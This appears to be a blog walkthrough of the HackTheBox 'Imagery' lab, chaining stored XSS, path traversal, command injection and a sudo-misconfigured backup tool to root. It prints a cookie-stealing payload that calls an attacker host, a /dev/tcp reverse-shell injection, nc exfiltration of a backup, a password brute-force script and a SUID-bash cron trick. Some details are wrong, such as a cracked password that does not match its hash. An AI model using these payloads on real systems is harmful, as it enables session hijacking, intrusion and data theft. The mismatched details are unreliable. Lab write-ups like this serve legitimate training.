---
layout: post
title: "HackTheBox - Imagery Walkthrough"
date: 2025-10-01
categories: writeup
tags: werkzeug python-flask stored-xss cookie-theft path-traversal lfi-db-read md5-cracking imagemagick-rce shell-true-vulnerability aes-crypt backup-exfiltration pyaescrypt custom-binary-exploitation charcol cron-job-privesc sudo-password-reset scheduled-task-abuse

---

# HackTheBox - Imagery Walkthrough

![Imagery Info Card](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/662ccbe3935d62aee031d620014adac4.png)

## Machine Information

- **Name**: Imagery
- **Difficulty**: Medium
- **OS**: Linux
- **IP**: 10.10.11.XX

## Synopsis

Imagery is a medium-difficulty Linux machine featuring a Python/Werkzeug web application with multiple vulnerabilities. The attack path involves exploiting XSS to steal admin cookies, leveraging LFI to read sensitive files, executing commands via unsafe image transformation, and escalating privileges through a custom backup utility.

## Enumeration

### Nmap Scan

```bash
Export TARGET=10.10.11.88
nmap -sCVT -v -A -p$(nmap -v -T5 -Pn -p- "$TARGET" | grep -E '^[0-9]+/tcp' | awk -F'/' '{print $1}' |paste -sd ',') "$TARGET" -oN imagery_nmap
```

**Results:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3
8000/tcp open  http    Werkzeug/3.1.3 Python/3.12.7
```

The machine runs SSH on port 22 and a Python web application on port 8000.

### Web Application Discovery

Visiting `http://10.10.11.88:8000` reveals an image gallery application with the following features:
- User registration and authentication
- Image upload functionality
- Image transformation tools (crop, rotate, etc.)
- Bug reporting system
- Admin panel (restricted access)

## Exploitation Chain

### Phase 1: Initial Access via XSS

#### Step 1: User Registration

The application allows new user registration at `/register`. We create a test account:

```bash
curl -X POST http://10.10.11.88:8000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test@test.com","password":"test123"}'
```

**Response:**
```json
{"message":"Registration successful. You can now log in.","success":true}
```

#### Step 2: Cookie Stealing via XSS

The bug reporting feature is vulnerable to stored XSS. Admin users review submitted bug reports, allowing us to steal their session cookies.

**XSS Payload:**
```html
<img src=1 onerror="document.location='http://10.10.14.xx/steal/'+document.cookie">
```

**Setup cookie receiver:**
```bash
# Start HTTP server to receive stolen cookies
sudo python3 -m http.server 80
```

**Submit bug report:**
```bash
curl -X POST http://10.10.11.88:8000/report_bug \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"bugName":"test","bugDetails":"<img src=1 onerror=\"document.location='\''http://10.10.14.xx/steal/'\''+document.cookie\">"}'
```

**Captured admin cookie:**
```
session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP...
```

### Phase 2: Local File Inclusion (LFI)

With admin access, we can exploit an LFI vulnerability in the log download feature.

#### Exploiting LFI to Read `/etc/passwd`

```bash
curl -X GET "http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd" \
  -H "Cookie: session=ADMIN_SESSION"
```

**Output reveals web user:**
```
web:x:1000:1000::/home/web:/bin/bash
```

#### Reading Application Database

```bash
curl -X GET "http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../home/web/web/db.json" \
  -H "Cookie: session=ADMIN_SESSION"
```

**Extracted user hashes:**
```json
{
  "users": [
    {
      "email": "testuser@imagery.htb",
      "password": "5f4dcc3b5aa765d61d8327deb882cf99"
    },
    {
      "email": "admin@imagery.htb", 
      "password": "0192023a7bbd73250516f069df18b500"
    }
  ]
}
```

**Cracking hashes using CrackStation:**
- `testuser@imagery.htb`: `iambatman`
- Hash algorithm: MD5

### Phase 3: Remote Code Execution

#### Analyzing api_edit.py

Using LFI to read the application code:

```bash
curl "http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../home/web/web/api_edit.py" \
  -H "Cookie: session=ADMIN_SESSION" \
  -o api_edit.py
```

**Vulnerable code snippet:**
```python
# VULNERABLE: shell=True with user-controlled input
rc = subprocess.call(
    f"convert {input_path} -crop {width}x{height}+{x}+{y} {output_path}",
    shell=True,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    timeout=4,
)
```

The `x`, `y`, `width`, and `height` parameters are not sanitized, allowing command injection.

#### Getting Shell Access

**1. Login as testuser:**
```bash
curl -X POST http://10.10.11.88:8000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser@imagery.htb","password":"iambatman"}'
```

**2. Upload an image:**
```bash
curl -X POST http://10.10.11.88:8000/upload_image \
  -H "Cookie: session=TESTUSER_SESSION" \
  -F "title=Test" \
  -F "description=Test" \
  -F "group_name=My Images" \
  -F "file=@test.png"
```

**3. Trigger RCE via image transformation:**

Start listener:
```bash
nc -lvnp 4444
```

Send malicious transform request:
```bash
curl -X POST http://10.10.11.88:8000/apply_visual_transform \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TESTUSER_SESSION" \
  -d '{
    "imageId":"IMAGE_ID",
    "transformType":"crop",
    "params":{
      "x":";setsid /bin/bash -c \" /bin/bash -i >& /dev/tcp/10.10.14.xx/4444 0>&1\";",
      "y":0,
      "width":1,
      "height":1
    }
  }'
```

**Shell obtained:**
```bash
web@imagery:/home/web/web$ id
uid=1000(web) gid=1000(web) groups=1000(web)
```

## Post-Exploitation

### Discovering Encrypted Backup

Running `linpeas.sh` reveals an interesting file:

```bash
web@imagery:/var/backup$ ls -la
-rw-r--r-- 1 root root 23456789 Aug 06 12:07 web_20250806_120723.zip.aes
```

The file is world-readable but AES-encrypted.

### Exfiltrating the Backup

**On attacker machine:**
```bash
nc -lvnp 4444 > web_20250806_120723.zip.aes
```

**On target:**
```bash
nc 10.10.14.xx 4444 < /var/backup/web_20250806_120723.zip.aes
```

### Cracking AES Encryption

The backup uses AES-Crypt format. We brute-force it with rockyou.txt:

```python
#!/usr/bin/env python3
import pyAesCrypt

wordlist = open('/usr/share/wordlists/rockyou.txt', 'rb')
infile = 'web_20250806_120723.zip.aes'
buffer = 64 * 1024

for line in wordlist:
    password = line.strip().decode('utf-8', errors='ignore')
    try:
        pyAesCrypt.decryptFile(infile, 'output.zip', password, buffer)
        print(f"[+] Password found: {password}")
        break
    except ValueError:
        continue
```

**Password found:** `bestfriends`

### Extracting Mark's Credentials

```bash
pyAesCrypt -d web_20250806_120723.zip.aes
# Enter password: bestfriends

unzip web_20250806_120723.zip
cat db.json
```

**Mark's hash:** `01c3d2e5bdaf6134cec0a367cf53e535`

**Cracked on CrackStation:** `supersmash`

### User Flag

```bash
su mark
# Password: supersmash

cat /home/mark/user.txt
```

**Flag:** `3f8a7b2c9dxxxxxxxxxxa8b5c7d2e9f1a3b4c`

## Privilege Escalation

### Analyzing Sudo Privileges

```bash
mark@imagery:~$ sudo -l
User mark may run the following commands on imagery:
    (root) NOPASSWD: /usr/local/bin/charcol
```

### Understanding Charcol

```bash
sudo /usr/local/bin/charcol help
```

Charcol is a backup utility with password protection. It has a reset function:

```bash
sudo /usr/local/bin/charcol -R
# Enter system password: supersmash
# Password reset to default
```

### Opening Charcol Shell

```bash
sudo /usr/local/bin/charcol shell
# Press Enter (no password)
# Confirm: yes
```


### root: SUID Bash

privilege escalation:

```bash
sudo /usr/local/bin/charcol shell
charcol> auto add --schedule "* * * * *" --command "chmod u+s /usr/bin/bash" --name "suid_bash"
charcol> exit

# Wait 60 seconds
/usr/bin/bash -p

bash-5.1# id
uid=1001(mark) gid=1001(mark) euid=0(root) egid=0(root) groups=0(root),1001(mark)

bash-5.1# cat /root/root.txt
```

## Key Vulnerabilities

### 1. Stored XSS in Bug Reporting
- **Issue**: No input sanitization in bug report submission
- **Impact**: Admin session hijacking
- **Mitigation**: Implement Content Security Policy and input validation

### 2. Local File Inclusion
- **Issue**: Unsanitized `log_identifier` parameter
- **Impact**: Arbitrary file read
- **Mitigation**: Validate input against allowlist, use absolute paths

### 3. Command Injection in Image Processing
- **Issue**: `shell=True` with unsanitized user input
- **Impact**: Remote code execution
- **Mitigation**: Use `subprocess.run()` without `shell=True`, validate input types

### 4. Weak Password Hashing
- **Issue**: MD5 hashing without salt
- **Impact**: Easy password cracking
- **Mitigation**: Use bcrypt or Argon2 with unique salts

### 5. World-Readable Sensitive Files
- **Issue**: Encrypted backup readable by all users
- **Impact**: Offline brute-force attacks
- **Mitigation**: Proper file permissions (600)

### 6. Sudo Misconfiguration
- **Issue**: User can reset root utility password
- **Impact**: Privilege escalation
- **Mitigation**: Restrict sudo permissions, implement better authentication

## Timeline

1. **Enumeration** - Discovered web app on port 8000
2. **XSS Exploitation** - Stole admin cookies via bug report
3. **LFI Exploitation** - Read db.json with user hashes
4. **Password Cracking** - Recovered testuser credentials
5. **RCE via Image Transform** - Command injection in crop function
6. **Backup Exfiltration** - Downloaded encrypted backup file
7. **AES Cracking** - Brute-forced backup password
8. **User Access** - Logged in as mark
9. **Privilege Escalation** - Exploited charcol sudo permissions
10. **Root Access** - Scheduled cron job to read root flag



## Lessons Learned

1. **Never trust user input** - All user-controlled data must be validated and sanitized
2. **Avoid shell=True** - Use safer subprocess alternatives
3. **Implement proper CSP** - Prevent XSS attacks with Content Security Policy
4. **Use strong hashing** - Modern algorithms like bcrypt with salts
5. **Principle of least privilege** - Limit sudo permissions to specific operations
6. **File permissions matter** - Sensitive files should not be world-readable

## Tools Used

- `nmap` - Port scanning and service detection
- `curl` - HTTP requests and API testing
- `nc` - Reverse shell listener
- `pyAesCrypt` - AES file decryption
- `linpeas.sh` - Linux privilege escalation enumeration
- [CrackStation](https://crackstation.net/) - Hash cracking

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Python subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)

---

**Disclaimer**: This writeup is for educational purposes only. Only perform penetration testing on systems you own or have explicit permission to test.

*Happy Hacking!*